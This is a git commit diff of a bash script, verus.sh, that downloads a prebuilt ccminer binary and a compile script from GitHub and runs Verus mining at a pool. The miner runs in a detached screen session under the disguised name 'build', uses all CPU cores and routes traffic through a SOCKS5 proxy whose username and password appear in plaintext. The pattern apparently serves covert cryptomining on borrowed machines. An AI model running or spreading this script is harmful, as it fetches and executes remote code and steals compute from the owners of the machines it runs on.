8781878ded34924c20fd696122a58af1c4e0dcbe
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-25 13:28:56 +0700

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-proxy="socks5://omar:omar@139.59.217.117:110"
+proxy="socks5://ewean:dikamarmandi@143.198.163.97:333"
 array[0]="0001"
 array[1]="0002"
 array[2]="0003"
@@ -7,10 +7,10 @@ size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
 apt-get update
-wget -q https://raw.githubusercontent.com/Omarjeto/ezz/master/compile.sh
-wget -qO build https://github.com/Omarjeto/ezz/blob/master/ccminer?raw=true
+wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
+wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
